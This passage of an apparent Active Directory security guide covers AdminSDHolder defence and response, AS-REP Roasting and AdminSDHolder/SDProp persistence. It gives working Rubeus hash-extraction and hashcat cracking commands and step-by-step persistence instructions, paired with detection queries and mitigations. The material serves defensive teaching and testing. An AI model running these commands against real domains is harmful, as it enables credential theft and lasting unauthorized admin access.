* Regularly conduct audits of AdminSDHolder permissions to identify and rectify any unauthorized or superfluous access rights.
* Implement strict policies to prevent users from holding administrative privileges that span across security boundaries. It is crucial to ensure that an attacker gaining initial access to a workstation cannot leverage this foothold to escalate privileges and infiltrate servers or domain controllers. Interrupting potential pathways and eliminating attack surfaces for privilege escalation is paramount.
* Vigorously apply the _**Principle of Least Privilege (PoLP)**_ , ensuring users are granted only the minimum levels of access necessary to perform their duties. This minimizes the potential impact of compromised accounts and helps maintain the integrity of the Active Directory environment.

**Respond**

**Difficulty: Low**

In the event that unauthorized permissions have been conferred upon the AdminSDHolder container, immediate action is required to mitigate the situation:

* Initiate the organization’s incident response protocol and promptly notify the designated response team to ensure a coordinated effort in addressing the issue.
* Proceed to eliminate the illicitly added ACL entries from the AdminSDHolder container. It is critical to perform this action prior to the execution of the SDProp process, which occurs every hour by default. By doing so, the propagation of unauthorized permissions to protected objects within Active Directory will be prevented.
* Change the password of the user account implicated in the unauthorized alteration of the AdminSDHolder container ACL. As an additional precautionary measure, consider temporarily disabling the account. This action serves two purposes: a) it expedites replication of the change across all domain controllers, thereby enhancing security, and b) it impedes further malicious activities by disrupting the adversary’s potential ongoing use of the compromised account.
* Isolate affected systems to facilitate through forensic analysis, alongside eradication and recovery efforts. This step is essential for identifying the scope of the breach, removing any residual threats, and restoring normal operations securely.

**Cracking Active Directory Passwords with AS-REP Roasting**

One common method attackers use to infiltrate an IT environment and escalate privileges is by stealing user password hashes and cracking them offline. Let’s explore a technique targeting specific user accounts through an attack known as AS-REP Roasting. We’ll dive into how adversaries execute AS-REP Roasting with the **Rubeus** tool and how you can protect your client organization from these attacks.

**What is AS-REP Roasting?**

AS-REP Roasting refers to a method utilized by attackers to pilfer the password hashes from user accounts configured with Kerberos preauthentication turned off. These stolen hashes can subsequently be subjected to offline cracking attempts.

Under normal circumstances, when preauthentication is active, an individual seeking access to a resource initiates the Kerberos authentication sequence by dispatching an Authentication Server Request (AS-REQ) to the domain controller (DC). This request incorporates a timestamp encrypted using the hash of the user’s password. Upon receiving this request, the DC attempts to decrypt the timestamp employing its stored copy of the user’s password hash. Successful decryption indicates the authenticity of the request, prompting the DC to issue an Authentication Server Response (AS-REP) message. This response contains a _**Ticket Granting Ticket (TGT),**_ which is essential for accessing resources within the Kerberos realm, issued by the _**Key Distribution Center (KDC).**_

If preauthentication is disabled, an attacker can request authentication data for any user, and the Domain Controller (DC) will respond with an AS-REP message. Since a portion of this message is encrypted with the user’s password, the attacker can then attempt to brute-force the password offline.

Fortunately, preauthentication is enabled by default in Active Directory; however, it can be turned off for a user account using the setting shown below:

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/4 (4).png>)

**Performing AS-REP Roasting with Rubeus**

With Rubeus, you can quickly execute AS-REP Roasting to test how this attack might work in your environment. Just run the following command:

Rubeus.exe asreproast

This command will automatically local all accounts that don’t require preauthenticaiton and extract their AS-REP hashes for offline cracking, as illustrated below:

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/5 (4).png>)

Let's take it a step further by extracting the data in a format that can be cracked offline using Hashcat. The following command will save the AS-REP hash information to a text file:

\`\`\`bash

Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt

\`\`\`

Once you have the hashes, cracking them with Hashcat is straightforward. Just specify the correct hash-mode code for AS-REP hashes, your hash file, and a dictionary for brute-force password guessing:

\`\`\`bash

hashcat64.exe -m 18200 c:\Temp\hashes.txt example.dict

\`\`\`

![A screenshot of a computer program

Description automatically generated](<../.gitbook/assets/6 (4).png>)

**Protecting Against AS-REP Roasting**

As you can see, AS-REP Roasting offers an easy method for attackers to steal the password hashes of user accounts that don't require preauthentication, and it doesn't require any special privileges. Fortunately, there are several effective ways to defend against these attacks.

\*\*Identify Accounts that Do Not Require Preauthentication\*\*

The most effective way to block AS-REP Roasting attacks is to identify all user accounts that are configured without Kerberos preauthentication and then enable this setting. You can use the following script to find these vulnerable accounts:

\`\`\`bash

Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name

\`\`\`

The output will look like this:

![](<../.gitbook/assets/7 (3).png>)

**Password Strength**

Another effective defense against AS-REP Roasting attacks is enforcing long, complex passwords that are hard to crack even if stolen. Implementing fine-grained password policies, particularly for privileged accounts, is a great starting point.

**AD Privileges**

It's also essential to identify which user accounts have the permissions to modify the setting that controls preauthentication. These accounts could temporarily disable it, capture the AS-REP hash, and then re-enable it. To list all access rights over user accounts that don't require preauthentication, you can use this query:

\`\`\`bash

(Get-ACL "AD:\\$((Get-ADUser -Filter 'useraccountcontrol -band 4194304').distinguishedName)").Access

\`\`\`

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/8 (3).png>)

**Change Monitoring**

Lastly, it's important to monitor for the disabling of Kerberos preauthentication. Event 4738 logs any changes to this user setting:

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/9 (3).png>)

Alternatively, you can monitor event ID 5136:

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/10 (3).png>)

**Active Directory Persistence: Leverage AdminSDHolder and SDProp to (Re)Gain Domain Admin Rights**

This attack describes a method by which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for 5 minutes.

**AdminSDHolder Overview**

The AdminSDHolder is an object within the System Partition of Active Directory (located at \`cn=adminsdholder,cn=system,dc=domain,dc=com\`). It serves as a security template for objects that belong to certain privileged groups. These groups' objects are regularly enumerated, and any discrepancies between their security descriptors and the AdminSDHolder ACL are flagged for updating. The Security Descriptor Propagator (SDProp) process, which runs every 60 minutes on the Primary Domain Controller (PDC) Emulator, re-applies the object’s Access Control List (ACL) with the security permissions configured on the AdminSDHolder.

![](<../.gitbook/assets/11 (3).png>)

Objects protected by AdminSDHolder have the "AdminCount" attribute set to 1, and security inheritance is disabled.

It's important to note that when an object is removed from one of the protected groups, the "AdminCount" attribute is not reset to another value. This behavior stems from early feedback when Windows 2000 was first released.

\*\*Default AdminSDHolder Security ACLs\*\*

The AdminSDHolder object's permissions serve as an ACL template for domain privileged groups. The relevant default ACLs for AdminSDHolder include:

\- \*\*Authenticated Users:\*\* Read

\- \*\*SYSTEM:\*\* Full Control

\- \*\*Administrators:\*\* Modify

\- \*\*Domain Admins:\*\* Modify

\- \*\*Enterprise Admins:\*\* Modify

![A screenshot of a computer program

Description automatically generated](<../.gitbook/assets/12 (3).png>)

**AdminSDHOlder Default Protected Objects**

SDProp Protected Objects (Windows Server 2008 & Windows Server 2008 R2):

* Account Operators
* Administrator
* Administrators
* Backup Operators
* Domain Admins
* Domain Controllers
* Enterprise Admins
* Krbtgt
* Read-only Domain Controllers (RoDC)
* Replicator (repl)
* Schema Admins
* Server Operators

A subset of these groups can be excluded from control, including Account Operators, Server Operators, Print Operators, Backup Operators.

Around 60 minutes later, the PDC Emulator runs the SDProp process, and the account may gain full control over the Domain Admins group. Alternatively, you can manually trigger SDProp.

In Windows Server 2008 R2 and later, Microsoft introduced a new rootDSE LDAP modify operation called \`RunProtectAdminGroupsTask\` to start the AdminSDHolder process. This mechanism offers a more efficient way to enforce AdminSDHolder application compared to the older approach.

\### Differences Between Mechanisms:

\- \*\*RunProtectAdminGroupsTask (Windows Server 2008 R2 and later):\*\* This method provides a more streamlined and efficient enforcement of AdminSDHolder settings.

\- \*\*FixUpInheritance (prior to Windows Server 2008 R2):\*\* This older mechanism starts the Security Descriptor Propagator Update (SDProp) process, which also affects the ACLs of critical security groups and accounts but is less efficient and takes longer to complete. SDProp is responsible for propagating changes to inheritable Access Control Entries (ACEs) on parent objects to their child objects. It is triggered automatically when an object's ACL is modified or when an object is moved. Because SDProp processes all Active Directory (AD) child objects' ACLs, it consumes significantly more processing time on domain controllers.

\### Manual Triggering of the SDProp Process:

For environments running versions prior to Windows Server 2008 R2, you can manually trigger the SDProp process. This is typically done through:

\- \*\*The \`FixUpInheritance\` mechanism\*\* which forces the update of ACLs on child objects.

By using the \`RunProtectAdminGroupsTask\` in newer versions of Windows Server, you can ensure that the AdminSDHolder process is applied efficiently without the performance overhead associated with the older SDProp mechanism.

![](<../.gitbook/assets/13 (3).png>)

Windows 2008 R2 RunProtectAdminGroupsTasks-based mechanism:

![](<../.gitbook/assets/14 (3).png>)

**Exploiting AdminSDHolder and SDProp**

Add the account or group to the AdminSDHolder object permissions granting either Full Control or Modify rights.

The user “Bobafett” is added in this example:

![](<../.gitbook/assets/15 (3).png>)

After running SDProp, Bobafett is automatically added to the Domain Admins group (along with the others listed above). Now this account can modify the Domain Admins group membership:

![](<../.gitbook/assets/16 (3).png>)

Note that the user account Bobafett has no group membership.

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/17 (2).png>)

Despite not being a member of any groups, this account can now modify the group membership of Domain Admins.

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/18 (2).png>)

![A screenshot of a computer

Description automatically generated](../.gitbook/assets/19.png)

\### \*\*Conclusion:\*\*

AdminSDHolder is a subtle yet powerful method attackers can use to maintain control over privileged groups in Active Directory. By leveraging this key security component, even if permissions on a protected group or user are altered, the Security Descriptor Propagator (SDProp) will restore the security permissions to those of the AdminSDHolder object.

\### \*\*Detection:\*\*

1\. \*\*Monitor ACLs on AdminSDHolder:\*\*

\- Regularly check the Access Control Lists (ACLs) configured on the AdminSDHolder object. These ACLs should remain at their default settings, and it is generally unnecessary to add other groups to this ACL.

2\. \*\*Identify AdminCount = 1 Accounts:\*\*

\- Monitor users and groups with \`AdminCount = 1\` to detect accounts with ACLs set by SDProp. Use the following PowerShell command to find all users and groups with security ACLs set by SDProp:

\`\`\`powershell

Import-Module ActiveDirectory

Get-ADObject -LDAPFilter "(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))" -Properties MemberOf,Created,Modified,AdminCount

\`\`\`

By keeping an eye on these aspects, you can better manage and detect any potential misuse or unwanted changes related to AdminSDHolder and SDProp.
